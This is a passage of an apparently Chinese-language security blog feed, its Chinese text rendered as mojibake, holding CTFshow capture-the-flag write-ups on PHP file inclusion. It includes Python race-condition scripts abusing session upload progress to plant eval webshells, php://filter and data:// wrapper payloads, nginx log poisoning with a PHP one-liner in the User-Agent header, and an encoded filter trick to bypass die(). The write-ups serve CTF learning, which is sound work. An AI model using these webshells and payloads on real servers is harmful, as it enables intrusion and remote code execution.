<code>?..CTFSHOW..=phpinfo</code></p><p>å¯ä»¥çœ‹åˆ° <code>session.use_strict_mode</code> ä¸º Offï¼Œè¯´æ˜å¯ä»¥è‡ªå®šä¹‰ <code>session_id</code>ï¼Œæ§åˆ¶ <code>session</code> æ–‡ä»¶åï¼Œ <code>session.save_path</code> ä¸ºç©ºï¼Œç¡®å®šæ–‡ä»¶åŒ…å«è·¯å¾„ <code>/tmp/sess_&#123;session_id&#125;</code>ã€‚æ”¹ä¸€ä¸‹ç¥–ä¼ è„šæœ¬å†™ shellã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingurl <span class="token operator">=</span> <span class="token string">'http://fa7db7de-329e-44cf-8270-bcd8d7f96368.challenge.ctf.show:8080/?isVIP=1'</span>event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string">'aaaaaa&lt;?php file_put_contents("/var/www/html/s.php", base64_decode("PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg=="));?>'</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">)</span>        _ <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">'down'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'verysafe.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"ctf"</span><span class="token punctuation">:</span> <span class="token string">"/tmp/sess_down"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'aaaaaa'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'retry'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    event<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>[PHPæ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆåˆ©ç”¨phpinfoï¼‰](<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">vulhub&#x2F;php&#x2F;inclusion&#x2F;README.zh-cn.md at master Â· vulhub&#x2F;vulhub (github.com)</a>)</p><p>è¿™ç¯‡è¯¦ç»†è®²è§£äº†æ¼æ´çš„åˆ©ç”¨ï¼Œä¹‹å‰çš„æ¡ä»¶ç«äº‰å°±æ˜¯è¿™æ ·</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> phpç‰¹æ€§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EZinclude</title>
      <link href="/2024/06/29/EZinclude/"/>
      <url>/2024/06/29/EZinclude/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>ä¸»è¦è€ƒå¯Ÿæ˜¯phpä¼ªåè®®ï¼Œä¹‹å‰Rceé‡Œä¹Ÿæœ‰æè¿‡ï¼Œè¿™é‡Œæ”¾å‡ ä¸ªå¸¸ç”¨Payload</p><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</p></blockquote><blockquote><p>data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64ç¼–ç åçš„æ•°æ®)</p></blockquote><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF-8.UTF-7&#x2F;resource&#x3D;flag.php  </p></blockquote><blockquote><p>php:&#x2F;&#x2F;input<br>POST cmd</p></blockquote><h3 id="web78-117"><a href="#web78-117" class="headerlink" title="web78-117"></a>web78-117</h3><h4 id="web78-php"><a href="#web78-php" class="headerlink" title="web78(php)"></a>web78(php)</h4><p>ç­¾åˆ°</p><p>Payload: <code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h4 id="web79-data"><a href="#web79-data" class="headerlink" title="web79(data)"></a>web79(data)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>å°†phpè¿‡æ»¤ï¼Œå¯ä»¥è€ƒè™‘data</p><p>Payload:</p><blockquote><pre class="language-php" data-language="php"><code class="language-php">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre></blockquote><h4 id="web80-nginxæ—¥å¿—æ³¨å…¥"><a href="#web80-nginxæ—¥å¿—æ³¨å…¥" class="headerlink" title="web80(nginxæ—¥å¿—æ³¨å…¥)"></a>web80(nginxæ—¥å¿—æ³¨å…¥)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>dataä¹Ÿè¢«banäº†</p><p>ä½¿ç”¨nginxæ—¥å¿—æ–‡ä»¶åŒ…å«ï¼Œåœ¨User-Agentå†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œä½¿ç”¨èšå‰‘è¿æ¥<a href="https://xxx.ctfshow/?file=/var/log/nginx">https://xxx.ctfshow?file=/var/log/nginx</a>  getshell</p><p>Payload:</p><blockquote><p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>User-Agent: <?php @eval($_POST['attack']);?></p></blockquote><p>çœ‹é¢˜è§£ä¹Ÿå¯ä»¥å¤§å°å†™ç»•è¿‡ç”¨PHP:&#x2F;&#x2F;input</p><h4 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h4><p>å¤šè¿‡æ»¤äº†å†’å·ï¼Œæ‰€ä»¥ä¾æ—§å¯ä»¥nginxæ—¥å¿—æ³¨å…¥</p><h4 id="web82-åˆ©ç”¨session-upload-progressè¿›è¡Œæ–‡ä»¶åŒ…å«"><a href="#web82-åˆ©ç”¨session-upload-progressè¿›è¡Œæ–‡ä»¶åŒ…å«" class="headerlink" title="web82(åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«)"></a>web82(åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«)</h4><p><a href="https://www.freebuf.com/vuls/202819.html">åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«å’Œååºåˆ—åŒ–æ¸—é€</a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¦‚æœsession.auto_start&#x3D;On ï¼Œåˆ™PHPåœ¨æ¥æ”¶è¯·æ±‚çš„æ—¶å€™ä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionï¼Œä¸å†éœ€è¦æ‰§è¡Œsession_start()ã€‚ä½†é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªé€‰é¡¹éƒ½æ˜¯å…³é—­çš„ã€‚ä½†sessionè¿˜æœ‰ä¸€ä¸ªé»˜è®¤é€‰é¡¹ï¼Œsession.use_strict_modeé»˜è®¤å€¼ä¸º0ã€‚æ­¤æ—¶ç”¨æˆ·æ˜¯å¯ä»¥è‡ªå·±å®šä¹‰Session IDçš„ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨Cookieé‡Œè®¾ç½®PHPSESSID&#x3D;TGAOï¼ŒPHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š&#x2F;tmp&#x2F;sess_TGAOâ€ã€‚å³ä½¿æ­¤æ—¶ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–Sessionï¼ŒPHPä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionã€‚ å¹¶äº§ç”Ÿä¸€ä¸ªé”®å€¼ï¼Œè¿™ä¸ªé”®å€¼æœ‰ini.get(â€œsession.upload_progress.prefixâ€)+ç”±æˆ‘ä»¬æ„é€ çš„session.upload_progress.nameå€¼ç»„æˆï¼Œæœ€åè¢«å†™å…¥sess_æ–‡ä»¶é‡Œã€‚</p><p>ä½†æ˜¯é—®é¢˜æ¥äº†ï¼Œé»˜è®¤é…ç½®session.upload_progress.cleanup &#x3D; onå¯¼è‡´æ–‡ä»¶ä¸Šä¼ åï¼Œsessionæ–‡ä»¶å†…å®¹ç«‹å³æ¸…ç©ºï¼Œ</p><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç«äº‰ï¼Œåœ¨sessionæ–‡ä»¶å†…å®¹æ¸…ç©ºå‰è¿›è¡ŒåŒ…å«åˆ©ç”¨ã€‚</p><p><strong>sessionæ–‡ä»¶é»˜è®¤å­˜å‚¨è·¯å¾„</strong></p><p>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID</p><p><strong>æ–¹æ³•ä¸€:</strong></p><p>å…ˆä»¥POSTçš„å½¢å¼å‘åŒ…ï¼Œä¸Šä¼ çš„æ–‡ä»¶éšæ„,ä¸‹é¢æ˜¯æ„é€ çš„ä¸Šä¼ è¡¨å•</p><pre class="language-none"><code class="language-none">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;79b5dbc7-b641-4e30-b8d9-4278f2234938.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>ä½¿ç”¨burpè¿›è¡Œçˆ†ç ´ï¼ˆä¸¤ä¸ªè¦åŒæ—¶çˆ†ç ´ï¼‰</p><p><img src="web82.png" loading="lazy"></p><p><img src="web82_2.png" loading="lazy"></p><p>æœ€åç«äº‰å¾—åˆ°flag</p><p><strong>æ–¹æ³•äºŒ</strong>:</p><p>å¯ä»¥åˆ©ç”¨è„šæœ¬è¿›è¡Œæ¡ä»¶ç«äº‰</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingsessid <span class="token operator">=</span> <span class="token string">'Qftm'</span>url <span class="token operator">=</span> <span class="token string">'https://2fdf78b8-ded3-49bb-8ebc-1bc7fac6b480.challenge.ctf.show/'</span><span class="token keyword">def</span> <span class="token function">POST</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            url<span class="token punctuation">,</span>            data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span><span class="token string">"&lt;?php system('cat *');fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[mtfQ])?>');?>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'q.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessid<span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">READ</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">?file=/tmp/sess_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sessid<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+++]retry'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>POST<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    READ<span class="token punctuation">(</span>session<span class="token punctuation">)</span></code></pre><h4 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h4><p>æ¡ä»¶ç«äº‰åŒä¸Š</p><h4 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h4><p>æ·»åŠ äº†å¦‚ä¸‹ä»£ç </p><p>system(â€œrm -rf &#x2F;tmp&#x2F;*â€);</p><p>&#x2F;&#x2F; åœ¨ rm -rf &#x2F;tmp&#x2F;* æ‰§è¡Œä¹‹åç«‹åˆ»æœ‰æ–°çš„è¯·æ±‚åˆ›å»ºäº† sess_shell æ–‡ä»¶ æ¡ä»¶ç«äº‰ä¾ç„¶æœ‰æ•ˆ</p><h4 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h4><p>æ·»åŠ äº†ä¸€ä¸ªå†…å®¹è¯†åˆ«ï¼Œå¦‚æœæœ‰<code>&lt;</code>å°±dieï¼Œä¾æ—§å¯ä»¥ç«äº‰ã€‚</p><h4 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h4><p>dirname(<strong>FILE</strong>)è¡¨ç¤ºå½“å‰æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚set_include_pathå‡½æ•°,æ˜¯ç”¨æ¥è®¾ç½®includeçš„è·¯å¾„çš„ï¼Œå°±æ˜¯include()å¯ä»¥ä¸æä¾›æ–‡ä»¶çš„å®Œæ•´è·¯å¾„äº†ã€‚<br>includeæ–‡ä»¶æ—¶,å½“åŒ…å«è·¯å¾„æ—¢ä¸æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œä¹Ÿä¸æ˜¯ç»å¯¹è·¯å¾„æ—¶(å¦‚:include(â€œtest.phpâ€))ï¼Œä¼šå…ˆæŸ¥æ‰¾include_pathæ‰€è®¾ç½®çš„ç›®å½•ã€‚<br>è„šæœ¬é‡Œç”¨çš„æ˜¯å®Œæ•´è·¯å¾„ï¼Œä¸å½±å“ç«äº‰ã€‚</p><h4 id="web87-file-put-contents"><a href="#web87-file-put-contents" class="headerlink" title="web87(file_put_contents)"></a>web87(file_put_contents)</h4><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET['file']))&#123;    $file = $_GET['file'];    $content = $_POST['content'];    $file = str_replace("php", "???", $file);    $file = str_replace("data", "???", $file);    $file = str_replace(":", "???", $file);    $file = str_replace(".", "???", $file);    file_put_contents(urldecode($file), "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'å¤§ä½¬åˆ«ç§€äº†'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>".$content);&#125;</code></pre><p>file_put_contents() å‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ã€‚</p><p><a href="https://www.runoob.com/php/func-filesystem-file-put-contents.html">PHP file_put_contents() å‡½æ•°</a></p><p><a href="https://xz.aliyun.com/t/8163?time__1311=n4+xuDgDBDyGKAKD=D7Dl1oQ447wWhSwi2iD&alichlgref=https://xz.aliyun.com/t/8163#toc-3">file_put_contentå’Œæ­»äº¡Â·æ‚ç³…ä»£ç ä¹‹ç¼˜</a></p><p>å‚è€ƒå¤§ä½¬æ–‡ç« ï¼Œå¯ä»¥ä½¿ç”¨base64æˆ–è€…rot13æ¥è¿›è¡Œå¯¹å‰é¢ä»£ç è¿›è¡Œæ‚ç³…</p><p>é¦–å…ˆæ„é€ $fileï¼Œå› ä¸ºè¦å¯¹fileè¿›è¡Œä¸€æ¬¡urlè§£ç æ‰€ä»¥æˆ‘ä»¬å¯¹payloadè¿›è¡Œä¸¤æ¬¡urlç¼–ç </p><p>æ™šä¸Šå¤§å¤šå·¥å…·æ˜¯å¯¹è‹±æ–‡å­—ç¬¦ä¸è¿›è¡Œurlç¼–ç çš„ï¼Œæ‰€ä»¥è¿™é‡Œç»™å‡ºè„šæœ¬æ–¹ä¾¿è¿›è¡Œurlencode</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse<span class="token keyword">def</span> <span class="token function">encode_char</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># æŒ‡å®šå­—ç¬¦é›†ï¼Œè½¬æ¢ä¸ºASCIIç åï¼Œå†è½¬æ¢ä¸º16è¿›åˆ¶ï¼Œå¹¶æ·»åŠ %</span>    special_chars <span class="token operator">=</span> <span class="token string">"!#$&amp;'()*+,/:;=?@-._~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>    <span class="token keyword">if</span> char <span class="token keyword">in</span> special_chars<span class="token punctuation">:</span>        <span class="token comment"># è½¬æ¢ä¸ºASCIIç ï¼Œç„¶åè½¬æ¢ä¸º16è¿›åˆ¶ï¼Œå¹¶æ·»åŠ %</span>        <span class="token keyword">return</span> <span class="token string">'%&#123;:02x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment"># å¯¹å…¶ä»–å­—ç¬¦è¿›è¡ŒURLç¼–ç </span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">url_encode</span><span class="token punctuation">(</span>input_string<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># å¯¹å­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªå­—ç¬¦è¿›è¡Œç¼–ç </span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>encode_char<span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token keyword">for</span> char <span class="token keyword">in</span> input_string<span class="token punctuation">)</span>input_string <span class="token operator">=</span> <span class="token string">"Test"</span>encoded_string <span class="token operator">=</span> url_encode<span class="token punctuation">(</span>input_string<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>encoded_string<span class="token punctuation">)</span></code></pre><blockquote><p>php:&#x2F;&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;hsad.php</p><p>ä¸¤æ¬¡ç¼–ç åå¾—åˆ°</p><p>file&#x3D;%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%38%25%37%33%25%36%31%25%36%34%25%32%65%25%37%30%25%36%38%25%37%30</p></blockquote><p>ç„¶åè¿›è¡ŒPost content</p><p>base64å¯ä»¥ç»•è¿‡dieå‡½æ•°ã€‚å› ä¸ºbase64ç¼–ç èŒƒå›´æ˜¯ <code>0 ï½ 9,a ï½ z,A ï½ Z,+,/ ï¼Œ</code>æ‰€ä»¥é™¤äº†è¿™äº›å­—ç¬¦ï¼Œå…¶ä»–å­—ç¬¦éƒ½ä¼šè¢«å¿½ç•¥æ‰ã€‚</p><p>base64è¿‡æ»¤ä¹‹åå°±åªæœ‰(phpdie)6ä¸ªå­—ç¬¦äº†ï¼Œbase64è¦æ±‚æŠŠæ¯ä¸‰ä¸ª8Bitçš„å­—èŠ‚è½¬æ¢ä¸ºå››ä¸ª6Bitçš„å­—èŠ‚ï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿè¦å‡‘å¤Ÿå››ä¸ªå­—èŠ‚çš„å€æ•°ï¼Œé¿å…base64è§£ç å‡ºé—®é¢˜ï¼Œè¿™é‡ŒåŠ ä¸Šä¸¤ä¸ªå­—ç¬¦å³å¯ã€‚</p><blockquote><p>â€‹                    <?php system("tac fl0g.php");?></p><p>content&#x3D;aaPD9waHAgc3lzdGVtKCJ0YWMgZmwwZy5waHAiKTs&#x2F;Pg&#x3D;&#x3D;</p></blockquote><h4 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h4><p>å‘ç°è¿‡æ»¤çš„è¿˜æ˜¯æ¯”è¾ƒå¤šï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤ : é‚£æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨PHPä¼ªåè®®å°±æ˜¯ è¿™é‡Œä½¿ç”¨çš„æ˜¯ data:&#x2F;&#x2F;text&#x2F;plain;base64,poc å…¶å®å’Œ79å·®ä¸å¤š åªæ˜¯æ³¨æ„çš„æ˜¯ç¼–ç 